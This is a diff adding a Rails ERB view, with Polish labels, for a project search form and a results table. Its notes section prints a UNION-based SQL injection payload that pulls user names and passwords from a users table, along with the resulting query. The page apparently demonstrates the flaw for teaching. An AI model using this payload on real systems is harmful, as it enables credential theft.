@@ -1,0 +1,36 @@
+<fieldset>
+  <legend>Wyszukiwanie</legend>
+<% form_tag do %>
+  Nazwa:
+  <%= text_field_tag :title, params[:title], :size => 80 %> <br />
+  <%= submit_tag 'Wyszukaj'%>
+<% end %>
+</fieldset>
+<br /> <br />
+
+<% if @projects %>
+  <table>
+    <tr> 
+      <th>ID</th>
+      <th>Tytuł</th>
+      <th>Opis projektu</th>
+    </tr>
+    <% @projects.each do |project| %>
+    <tr>
+      <td><%= project.id %></td>
+      <td><%= project.title %> </td>
+      <td><%= project.description %> </td>
+    </tr>    
+    
+    <% end %>
+  </table>
+<% end %>
+
+<div id="notes">
+  
+') union select id,name as name,password as descritpion,1,1 from users -- <br/>
+<div class="small" onmouseover="this.className='big'" onmouseout="this.className='small'">
+  SELECT "projects".* FROM "projects" WHERE (title = '') union select id,name as name,password as description,1,1 from users --')
+</div>
+ 
+</div>
